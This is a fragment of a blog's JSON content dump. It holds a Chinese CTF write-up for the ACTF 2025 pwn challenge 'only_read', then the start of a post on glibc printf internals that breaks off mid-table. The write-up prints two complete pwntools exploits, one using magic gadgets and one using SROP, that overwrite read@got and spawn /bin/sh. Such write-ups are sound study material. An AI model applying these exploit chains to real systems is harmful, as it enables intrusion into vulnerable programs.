class=\"line\">got=<span class=\"number\">0x404000</span><span class=\"comment\">#--&gt;0x5f</span></span><br><span class=\"line\">leave=<span class=\"number\">0x40115D</span></span><br><span class=\"line\"></span><br><span class=\"line\">gdb.attach(io,<span class=\"string\">&quot;b *0x401158&quot;</span>)</span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">0x80</span>+p64(tar+<span class=\"number\">0x80</span>-<span class=\"number\">0x8</span>)+p64(read)</span><br><span class=\"line\">io.send(payload)</span><br><span class=\"line\">pause()</span><br><span class=\"line\"></span><br><span class=\"line\">payload=p64(bss+<span class=\"number\">0x100</span>-<span class=\"number\">0x90</span>)+p64(read+<span class=\"number\">4</span>)</span><br><span class=\"line\">payload=payload.ljust(<span class=\"number\">0x80</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)+p64(bss-<span class=\"number\">0x100</span>)+p64(read)</span><br><span class=\"line\">io.send(payload)</span><br><span class=\"line\">pause()</span><br><span class=\"line\"></span><br><span class=\"line\">s=SigreturnFrame()</span><br><span class=\"line\">bin_sh=<span class=\"number\">0x404710</span></span><br><span class=\"line\">s.rax=<span class=\"number\">0x3b</span></span><br><span class=\"line\">s.rdi=bin_sh</span><br><span class=\"line\">s.rdx=<span class=\"number\">0</span></span><br><span class=\"line\">s.rsi=<span class=\"number\">0</span></span><br><span class=\"line\">s.rip=<span class=\"number\">0x401044</span></span><br><span class=\"line\">payload =p64(bss).ljust(<span class=\"number\">0x80</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)+p64(got+<span class=\"number\">0x80</span>)+p64(read)</span><br><span class=\"line\">payload+=<span class=\"string\">b&quot;/bin/sh\\x00&quot;</span>+<span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">0x160</span>+p64(rbp)+p64(<span class=\"number\">0xf</span>+<span class=\"number\">0x80</span>)+p64(read)+<span class=\"built_in\">bytes</span>(s)[<span class=\"number\">8</span>:]</span><br><span class=\"line\">io.send(payload)</span><br><span class=\"line\">pause()</span><br><span class=\"line\">io.send(<span class=\"string\">b&#x27;\\x5f&#x27;</span>)</span><br><span class=\"line\">pause()</span><br><span class=\"line\">io.sendline(<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n","excerpt":"","more":"<h1 id=\"ACTF-2025-pwn\"><a href=\"#ACTF-2025-pwn\" class=\"headerlink\" title=\"ACTF-2025-pwn\"></a>ACTF-2025-pwn</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>继续备战</p>\n<h2 id=\"only-read\"><a href=\"#only-read\" class=\"headerlink\" title=\"only_read\"></a>only_read</h2><p>题如其名，只有一个read 函数，通过magic gadgets 来打。当然也有其他解法</p>\n<h3 id=\"ida分析\"><a href=\"#ida分析\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h3><h3 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h3><h4 id=\"magic-gadgets\"><a href=\"#magic-gadgets\" class=\"headerlink\" title=\"magic gadgets\"></a>magic gadgets</h4><p>首先要知道经典的gadgets</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0x000000000040111c</span> : add dword ptr [rbp - <span class=\"number\">0x3d</span>], ebx ; nop ; ret</span><br><span class=\"line\"><span class=\"number\">0x0000000000110a46</span>: pop rbx; pop rbp; pop r12; pop r13; pop r14;</span><br></pre></td></tr></table></figure>\n<p>这两条gadgets，可以凑一个任意半个地址写。上面那个是程序里的，下面的是libc中的。选择这条是因为它的低三字节和read接近，只需要改两个字节，就可以把read修改为这个。（ps：4,5,6都是说第二次read时的payload）</p>\n<ol>\n<li>那么第一次read，就是修改rbp，然后返回read继续读。</li>\n<li>第二次read，前面0x80字节开始为后续的利用作准备。rbp设置为，这次的读入的地址，同时，这地址要下一次能修改到read@got[]</li>\n<li>第三次read，就修改掉read@got为0x110a46 这条gadget</li>\n<li>read结束之后，rsp指向rbp+8，rbp是之前设计好的，也就是会回到第二次read时的前0x80字节之间。在这里调用read@plt，来执行改好的gadget。这时可以控制rbx，rbp。</li>\n<li>然后，接上0x40111c这条gadget，把read@got[]改为ogg。</li>\n<li>然后，可以接一个pop_rbp抬栈，再调用read@plt，来执行ogg。</li>\n</ol>\n<h4 id=\"SROP\"><a href=\"#SROP\" class=\"headerlink\" title=\"SROP\"></a>SROP</h4><p>如何找syscall; ret;</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ROPgadget --binary libc.so.6 --opcode 0f05c3</span><br></pre></td></tr></table></figure>\n<p>这是找syscall的一个方法。当然read函数的过程中其实有syscall，我们只要把偏移改过去就行。当然要提前控制好<code>rax</code>, 那么这题就是要想办法控制<code>rax</code>为<code>0xf</code></p>\n<ol>\n<li>第一次read，修改rbp，返回read继续读。</li>\n<li>第二次read，前0x80字节可以部署一些准备工作，rbp往bss的高地址写，便于控制。</li>\n<li>第三次read，要控制rbp，为read@got[]附近，下一次要修改read偏移直接到sysread。同时把SigreturnFrame，部署在这里。</li>\n<li>第四次read，把偏移改好</li>\n<li>这一次，因为没有设置好rax，所以还是read，随便输下一次就是SROP。</li>\n</ol>\n<h4 id=\"nepnep\"><a href=\"#nepnep\" class=\"headerlink\" title=\"nepnep\"></a>nepnep</h4><p><a href=\"https://cn-sec.com/archives/4011487.html\">ACTF 2025 Writeup by Nepnep | CN-SEC 中文网</a></p>\n<h3 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h3><h4 id=\"magic-gadgets-1\"><a href=\"#magic-gadgets-1\" class=\"headerlink\" title=\"magic gadgets\"></a>magic gadgets</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> esy <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level=<span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">context.terminal=[<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>,<span class=\"string\">&#x27;-l&#x27;</span>,<span class=\"string\">&#x27;66%&#x27;</span>]</span><br><span class=\"line\">context.arch=<span class=\"string\">&quot;amd64&quot;</span></span><br><span class=\"line\">io,elf=loadfile(<span class=\"string\">&quot;./only_read&quot;</span>,<span class=\"string\">&quot;&quot;</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">0x000000000040111c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000058aa8 : pop rbp ; pop rbx ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x00000000000584d5 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000110a46: pop rbx; pop rbp; pop r12; pop r13; pop r14; ret;</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">one_gadgets=[<span class=\"number\">0xef52b</span>,<span class=\"number\">0xef4ce</span>,<span class=\"number\">0x583f3</span>,<span class=\"number\">0x583ec</span>]</span><br><span class=\"line\">gdb.attach(io,<span class=\"string\">&quot;b *0x401158&quot;</span>)</span><br><span class=\"line\">got_read = elf.got[<span class=\"string\">&#x27;read&#x27;</span>]</span><br><span class=\"line\">addr_reread = <span class=\"number\">0x401142</span></span><br><span class=\"line\">gadget=[<span class=\"number\">0x40111c</span>,<span class=\"number\">0x058aa8</span>,<span class=\"number\">0x0584d5</span>]</span><br><span class=\"line\">payload=<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">0x80</span>+p64(got_read+<span class=\"number\">0x100</span>)+p64(addr_reread)</span><br><span class=\"line\">io.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">rop_chain = <span class=\"string\">b&quot;1&quot;</span> * <span class=\"number\">8</span></span><br><span class=\"line\">rop_chain += flat([</span><br><span class=\"line\">    elf.plt[<span class=\"string\">&#x27;read&#x27;</span>],</span><br><span class=\"line\">    <span class=\"number\">0xfffdeae5</span>, <span class=\"comment\"># 修改read@got 为 ogg</span></span><br><span class=\"line\">    got_read + <span class=\"number\">0x3d</span>,</span><br><span class=\"line\">    <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>,</span><br><span class=\"line\">    gadget[<span class=\"number\">0</span>]</span><br><span class=\"line\">], length=<span class=\"number\">0x38</span>)</span><br><span class=\"line\">rop_chain += p64(gadget[<span class=\"number\">0</span>]+<span class=\"number\">1</span>)</span><br><span class=\"line\">rop_chain += p64(<span class=\"number\">0x404190</span>)</span><br><span class=\"line\">rop_chain += p64(elf.plt[<span class=\"string\">&#x27;read&#x27;</span>])</span><br><span class=\"line\">rop_chain = rop_chain.ljust(<span class=\"number\">0x80</span>, <span class=\"string\">b&quot;\\x00&quot;</span>)</span><br><span class=\"line\">rop_chain += p64(<span class=\"number\">0x403ff8</span> + <span class=\"number\">0x88</span>)</span><br><span class=\"line\">rop_chain += p64(addr_reread)</span><br><span class=\"line\">io.sendline(rop_chain)</span><br><span class=\"line\"></span><br><span class=\"line\">sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\">io.send(<span class=\"string\">b&quot;\\x46\\x0a&quot;</span>)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n<h4 id=\"SROP-1\"><a href=\"#SROP-1\" class=\"headerlink\" title=\"SROP\"></a>SROP</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> esy <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level=<span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">context.terminal=[<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>,<span class=\"string\">&#x27;-l&#x27;</span>,<span class=\"string\">&#x27;66%&#x27;</span>]</span><br><span class=\"line\">context.arch=<span class=\"string\">&quot;amd64&quot;</span></span><br><span class=\"line\">io,elf=loadfile(<span class=\"string\">&quot;./only_read&quot;</span>,<span class=\"string\">&quot;&quot;</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000098fb6: syscall; ret;</span></span><br><span class=\"line\"><span class=\"string\">0x000000000011c3f9: 0f05c3;</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">tar=<span class=\"number\">0x404088</span></span><br><span class=\"line\">bss=<span class=\"number\">0x404800</span></span><br><span class=\"line\">read=<span class=\"number\">0x401142</span></span><br><span class=\"line\">rbp=<span class=\"number\">0x40111D</span></span><br><span class=\"line\">got=<span class=\"number\">0x404000</span><span class=\"comment\">#--&gt;0x5f</span></span><br><span class=\"line\">leave=<span class=\"number\">0x40115D</span></span><br><span class=\"line\"></span><br><span class=\"line\">gdb.attach(io,<span class=\"string\">&quot;b *0x401158&quot;</span>)</span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">0x80</span>+p64(tar+<span class=\"number\">0x80</span>-<span class=\"number\">0x8</span>)+p64(read)</span><br><span class=\"line\">io.send(payload)</span><br><span class=\"line\">pause()</span><br><span class=\"line\"></span><br><span class=\"line\">payload=p64(bss+<span class=\"number\">0x100</span>-<span class=\"number\">0x90</span>)+p64(read+<span class=\"number\">4</span>)</span><br><span class=\"line\">payload=payload.ljust(<span class=\"number\">0x80</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)+p64(bss-<span class=\"number\">0x100</span>)+p64(read)</span><br><span class=\"line\">io.send(payload)</span><br><span class=\"line\">pause()</span><br><span class=\"line\"></span><br><span class=\"line\">s=SigreturnFrame()</span><br><span class=\"line\">bin_sh=<span class=\"number\">0x404710</span></span><br><span class=\"line\">s.rax=<span class=\"number\">0x3b</span></span><br><span class=\"line\">s.rdi=bin_sh</span><br><span class=\"line\">s.rdx=<span class=\"number\">0</span></span><br><span class=\"line\">s.rsi=<span class=\"number\">0</span></span><br><span class=\"line\">s.rip=<span class=\"number\">0x401044</span></span><br><span class=\"line\">payload =p64(bss).ljust(<span class=\"number\">0x80</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)+p64(got+<span class=\"number\">0x80</span>)+p64(read)</span><br><span class=\"line\">payload+=<span class=\"string\">b&quot;/bin/sh\\x00&quot;</span>+<span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">0x160</span>+p64(rbp)+p64(<span class=\"number\">0xf</span>+<span class=\"number\">0x80</span>)+p64(read)+<span class=\"built_in\">bytes</span>(s)[<span class=\"number\">8</span>:]</span><br><span class=\"line\">io.send(payload)</span><br><span class=\"line\">pause()</span><br><span class=\"line\">io.send(<span class=\"string\">b&#x27;\\x5f&#x27;</span>)</span><br><span class=\"line\">pause()</span><br><span class=\"line\">io.sendline(<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n"},{"title":"格式化字符串研究","cover":"/img/嘿猫猫.png","mathjax":true,"_content":"# 格式化字符串研究--一次性写的秘密\n\n## 相关定义\n\n### __printf \n\n因为printf 函数，会调用__printf函数。我们直接来看该函数\n它在/stdio-common/printf.c 中\n```c\n\nint\n__printf (const char *format, ...)\n{\n  va_list arg;\n  int done;\n\n  va_start (arg, format);\n  done = __vfprintf_internal (stdout, format, arg, 0);\n  va_end (arg);\n\n  return done;\n}\n\n#undef _IO_printf\nldbl_strong_alias (__printf, printf);\nldbl_strong_alias (__printf, _IO_printf);\n\n```\n\n可以看到，它主要就是调用了__vfprintf_internal函数，继续追踪\n\n### vfprintf_internal\n这个文件在/stdio-common/vfprintf_internal.c \n\n#### 宏相关定义\n在148行，有一个宏定义\n```c\n# define vfprintf __vfprintf_internal\n```\n\n还有一个显然是占位符的一个表，看样子,还是有使用顺序的,对应的顺序里找对应的表\n```c\n#define STEP0_3_TABLE\t\t\t\t\t\t\t      \\\n    /* Step 0: at the beginning.  */\t\t\t\t\t      \\\n    static JUMP_TABLE_TYPE step0_jumps[31] =\t\t\t\t      \\\n    {\t\t\t\t\t\t\t\t\t      \\\n      REF (form_unknown),\t\t\t\t\t\t      \\\n      REF (flag_space),\t\t/* for ' ' */\t\t\t\t      \\\n      REF (flag_plus),\t\t/* for '+' */\t\t\t\t      \\\n      REF (flag_minus),\t\t/* for '-' */\t\t\t\t      \\\n      REF (flag_hash),\t\t/* for '<hash>' */\t\t\t      \\\n      REF (flag_zero),\t\t/* for '0' */\t\t\t\t      \\\n      REF (flag_quote),\t\t/* for '\\'' */\t\t\t\t      \\\n      REF (width_asterics),\t/* for '*' */\t\t\t\t      \\\n      REF (width),\t\t/* for '1'...'9' */\t\t\t      \\\n      REF (precision),\t\t/* for '.' */\t\t\t\t      \\\n      REF (mod_half),\t\t/* for 'h' */\t\t\t\t      \\\n      REF (mod_long),\t\t/* for 'l' */\t\t\t\t      \\\n      REF (mod_longlong),\t/* for 'L', 'q' */\t\t\t      \\\n      REF (mod_size_t),\t\t/* for 'z', 'Z' */\t\t\t      \\\n      REF (form_percent),\t/* for '%' */\t\t\t\t      \\\n      REF (form_integer),\t/* for 'd', 'i' */\t\t\t      \\\n      REF (form_unsigned),\t/* for 'u' */\t\t\t\t      \\\n      REF (form_octal),\t\t/* for 'o' */\t\t\t\t      \\\n      REF (form_hexa),\t\t/* for 'X', 'x' */\t\t\t      \\\n      REF (form_float),\t\t/* for 'E', 'e', 'F', 'f', 'G', 'g' */\t      \\\n      REF (form_character),\t/* for 'c' */\t\t\t\t      \\\n      REF (form_string),\t/* for 's', 'S' */\t\t\t      \\\n      REF (form_pointer),\t/* for 'p' */\t\t\t\t      \\\n      REF (form_number),\t/* for 'n' */\t\t\t\t      \\\n      REF (form_strerror),\t/* for 'm' */\t\t\t\t      \\\n      REF (form_wcharacter),\t/* for 'C' */\t\t\t\t      \\\n      REF (form_floathex),\t/* for 'A', 'a' */\t\t\t      \\\n      REF (mod_ptrdiff_t),      /* for 't' */\t\t\t\t      \\\n      REF (mod_intmax_t),       /* for 'j' */\t\t\t\t      \\\n      REF (flag_i18n),\t\t/* for 'I' */\t\t\t\t      \\\n      REF (form_binary),\t/* for 'B', 'b' */\t\t\t      \\\n    };\t\t\t\t\t\t\t\t\t      \\\n    /* Step 1: after processing width.  */\t\t\t\t      \\\n    static JUMP_TABLE_TYPE step1_jumps[31] =\t\t\t\t      \\\n    {\t\t\t\t\t\t\t\t\t      \\\n      REF (form_unknown),\t\t\t\t\t\t      \\\n      REF (form_unknown),\t/* for ' ' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '+' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '-' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '<hash>' */\t\t\t      \\\n      REF (form_unknown),\t/* for '0' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '\\'' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '*' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '1'...'9' */\t\t\t      \\\n      REF (precision),\t\t/* for '.' */\t\t\t\t      \\\n      REF (mod_half),\t\t/* for 'h' */\t\t\t\t      \\\n      REF (mod_long),\t\t/* for 'l' */\t\t\t\t      \\\n      REF (mod_longlong),\t/* for 'L', 'q' */\t\t\t      \\\n      REF (mod_size_t),\t\t/* for 'z', 'Z' */\t\t\t      \\\n      REF (form_percent),\t/* for '%' */\t\t\t\t      \\\n      REF (form_integer),\t/* for 'd', 'i' */\t\t\t      \\\n      REF (form_unsigned),\t/* for 'u' */\t\t\t\t      \\\n      REF (form_octal),\t\t/* for 'o' */\t\t\t\t      \\\n      REF (form_hexa),\t\t/* for 'X', 'x' */\t\t\t      \\\n      REF (form_float),\t\t/* for 'E', 'e', 'F', 'f', 'G', 'g' */\t      \\\n      REF (form_character),\t/* for 'c' */\t\t\t\t      \\\n      REF (form_string),\t/* for 's', 'S' */\t\t\t      \\\n      REF (form_pointer),\t/* for 'p' */\t\t\t\t      \\\n      REF (form_number),\t/* for 'n' */\t\t\t\t      \\\n      REF (form_strerror),\t/* for 'm' */\t\t\t\t      \\\n      REF (form_wcharacter),\t/* for 'C' */\t\t\t\t      \\\n      REF (form_floathex),\t/* for 'A', 'a' */\t\t\t      \\\n      REF (mod_ptrdiff_t),      /* for 't' */\t\t\t\t      \\\n      REF (mod_intmax_t),       /* for 'j' */\t\t\t\t      \\\n      REF (form_unknown),       /* for 'I' */\t\t\t\t      \\\n      REF (form_binary),\t/* for 'B', 'b' */\t\t\t      \\\n    };\t\t\t\t\t\t\t\t\t      \\\n    /* Step 2: after processing precision.  */\t\t\t\t      \\\n    static JUMP_TABLE_TYPE step2_jumps[31] =\t\t\t\t      \\\n    {\t\t\t\t\t\t\t\t\t      \\\n      REF (form_unknown),\t\t\t\t\t\t      \\\n      REF (form_unknown),\t/* for ' ' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '+' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '-' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '<hash>' */\t\t\t      \\\n      REF (form_unknown),\t/* for '0' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '\\'' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '*' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '1'...'9' */\t\t\t      \\\n      REF (form_unknown),\t/* for '.' */\t\t\t\t      \\\n      REF (mod_half),\t\t/* for 'h' */\t\t\t\t      \\\n      REF (mod_long),\t\t/* for 'l' */\t\t\t\t      \\\n      REF (mod_longlong),\t/* for 'L', 'q' */\t\t\t      \\\n      REF (mod_size_t),\t\t/* for 'z', 'Z' */\t\t\t      \\\n      REF (form_percent),\t/* for '%' */\t\t\t\t      \\\n      REF (form_integer),\t/* for 'd', 'i' */\t\t\t      \\\n      REF (form_unsigned),\t/* for 'u' */\t\t\t\t      \\\n      REF (form_octal),\t\t/* for 'o' */\t\t\t\t      \\\n      REF (form_hexa),\t\t/* for 'X', 'x' */\t\t\t      \\\n      REF (form_float),\t\t/* for 'E', 'e', 'F', 'f', 'G', 'g' */\t      \\\n      REF (form_character),\t/* for 'c' */\t\t\t\t      \\\n      REF (form_string),\t/* for 's', 'S' */\t\t\t      \\\n      REF (form_pointer),\t/* for 'p' */\t\t\t\t      \\\n      REF (form_number),\t/* for 'n' */\t\t\t\t      \\\n      REF (form_strerror),\t/* for 'm' */\t\t\t\t      \\\n      REF (form_wcharacter),\t/* for 'C' */\t\t\t\t      \\\n      REF (form_floathex),\t/* for 'A', 'a' */\t\t\t      \\\n      REF (mod_ptrdiff_t),      /* for 't' */\t\t\t\t      \\\n      REF (mod_intmax_t),       /* for 'j' */\t\t\t\t      \\\n      REF (form_unknown),       /* for 'I' */\t\t\t\t      \\\n      REF (form_binary),\t/* for 'B', 'b' */\t\t\t      \\\n    };\t\t\t\t\t\t\t\t\t      \\\n    /* Step 3a: after processing first 'h' modifier.  */\t\t      \\\n    static JUMP_TABLE_TYPE step3a_jumps[31] =\t\t\t\t      \\\n    {\t\t\t\t\t\t\t\t\t      \\\n      REF (form_unknown),\t\t\t\t\t\t      \\\n      REF (form_unknown),\t/* for ' ' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '+' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '-' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '<hash>' */\t\t\t      \\\n      REF (form_unknown),\t/* for '0' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '\\'' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '*' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '1'...'9' */\t\t\t      \\\n      REF (form_unknown),\t/* for '.' */\t\t\t\t      \\\n      REF (mod_halfhalf),\t/* for 'h' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for 'l' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for 'L', 'q' */\t\t\t      \\\n      REF (form_unknown),\t/* for 'z', 'Z' */\t\t\t      \\\n      REF (form_percent),\t/* for '%' */\t\t\t\t      \\\n      REF (form_integer),\t/* for 'd', 'i' */\t\t\t      \\\n      REF (form_unsigned),\t/* for 'u' */\t\t\t\t      \\\n      REF (form_octal),\t\t/* for 'o' */\t\t\t\t      \\\n      REF (form_hexa),\t\t/* for 'X', 'x' */\t\t\t      \\\n      REF (form_unknown),\t/* for 'E', 'e', 'F', 'f', 'G', 'g' */\t      \\\n      REF (form_unknown),\t/* for 'c' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for 's', 'S' */\t\t\t      \\\n      REF (form_unknown),\t/* for 'p' */\t\t\t\t      \\\n      REF (form_number),\t/* for 'n' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for 'm' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for 'C' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for 'A', 'a' */\t\t\t      \\\n      REF (form_unknown),       /* for 't' */\t\t\t\t      \\\n      REF (form_unknown),       /* for 'j' */\t\t\t\t      \\\n      REF (form_unknown),       /* for 'I' */\t\t\t\t      \\\n      REF (form_binary),\t/* for 'B', 'b' */\t\t\t      \\\n    };\t\t\t\t\t\t\t\t\t      \\\n    /* Step 3b: after processing first 'l' modifier.  */\t\t      \\\n    static JUMP_TABLE_TYPE step3b_jumps[31] =\t\t\t\t      \\\n    {\t\t\t\t\t\t\t\t\t      \\\n      REF (form_unknown),\t\t\t\t\t\t      \\\n      REF (form_unknown),\t/* for ' ' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '+' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '-' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '<hash>' */\t\t\t      \\\n      REF (form_unknown),\t/* for '0' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '\\'' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '*' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '1'...'9' */\t\t\t      \\\n      REF (form_unknown),\t/* for '.' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for 'h' */\t\t\t\t      \\\n      REF (mod_longlong),\t/* for 'l' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for 'L', 'q' */\t\t\t      \\\n      REF (form_unknown),\t/* for 'z', 'Z' */\t\t\t      \\\n      REF (form_percent),\t/* for '%' */\t\t\t\t      \\\n      REF (form_integer),\t/* for 'd', 'i' */\t\t\t      \\\n      REF (form_unsigned),\t/* for 'u' */\t\t\t\t      \\\n      REF (form_octal),\t\t/* for 'o' */\t\t\t\t      \\\n      REF (form_hexa),\t\t/* for 'X', 'x' */\t\t\t      \\\n      REF (form_float),\t\t/* for 'E', 'e', 'F', 'f', 'G', 'g' */\t      \\\n      REF (form_character),\t/* for 'c' */\t\t\t\t      \\\n      REF (form_string),\t/* for 's', 'S' */\t\t\t      \\\n      REF (form_pointer),\t/* for 'p' */\t\t\t\t      \\\n      REF (form_number),\t/* for 'n' */\t\t\t\t      \\\n      REF (form_strerror),\t/* for 'm' */\t\t\t\t      \\\n      REF (form_wcharacter),\t/* for 'C' */\t\t\t\t      \\\n      REF (form_floathex),\t/* for 'A', 'a' */\t\t\t      \\\n      REF (form_unknown),       /* for 't' */\t\t\t\t      \\\n      REF (form_unknown),       /* for 'j' */\t\t\t\t      \\\n      REF (form_unknown),       /* for 'I' */\t\t\t\t      \\\n      REF (form_binary),\t/* for 'B', 'b' */\t\t\t      \\\n    }\n\n#define STEP4_TABLE\t\t\t\t\t\t\t      \\\n    /* Step 4: processing format specifier.  */\t\t\t\t      \\\n    static JUMP_TABLE_TYPE step4_jumps[31] =\t\t\t\t      \\\n    {\t\t\t\t\t\t\t\t\t      \\\n      REF (form_unknown),\t\t\t\t\t\t      \\\n      REF (form_unknown),\t/* for ' ' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '+' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '-' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '<hash>' */\t\t\t      \\\n      REF (form_unknown),\t/* for '0' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '\\'' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '*' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '1'...'9' */\t\t\t      \\\n      REF (form_unknown),\t/* for '.' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for 'h' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for 'l' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for 'L', 'q' */\t\t\t 